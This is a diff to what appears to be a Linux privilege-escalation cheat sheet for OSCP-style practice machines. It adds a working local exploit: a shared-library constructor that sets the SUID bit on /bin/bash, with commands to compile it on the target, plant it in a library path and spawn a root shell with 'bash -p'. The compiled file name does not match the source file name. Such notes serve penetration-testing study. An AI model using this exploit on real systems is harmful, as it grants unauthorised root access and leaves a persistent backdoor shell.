@@ -185,6 +185,7 @@ ls -la /etc/cron.*
 cat /var/spool/cron/crontabs/* 2>/dev/null
 crontab -l
 # Watch what actually fires (best evidence, run for 60-90s)
+# Pay attention to LD_LIBRARY_PATH=
 ```
 
 ```bash
@@ -353,3 +354,33 @@ netstat -tulnp 2>/dev/null
 9. Docker group / container escape
 
 **Most common on OSCP-style boxes, in observed frequency:** sudo misconfig with GTFOBins-able binary > credential reuse from a config/backup file > cron job writable script > SUID custom binary with a coded flaw > capabilities on python/perl.
+
+# Set SUID Bit
+
+exploit.c:
+```sh
+#include <stdio.h>  
+#include <stdlib.h>  
+  
+static void inject() __attribute__((constructor));  
+  
+void inject() {  
+system("chmod +s /bin/bash");  
+}
+```
+
+compile on target:
+```sh
+gcc -fPIC -shared linux-set-bash-suid.c -o utils.so
+```
+
+copy it to vulnerable point:
+```sh
+cp utils.so /usr/local/lib/dev/
+```
+
+## Run /bin/bash with SUID set
+
+```sh
+/bin/bash -p
+```
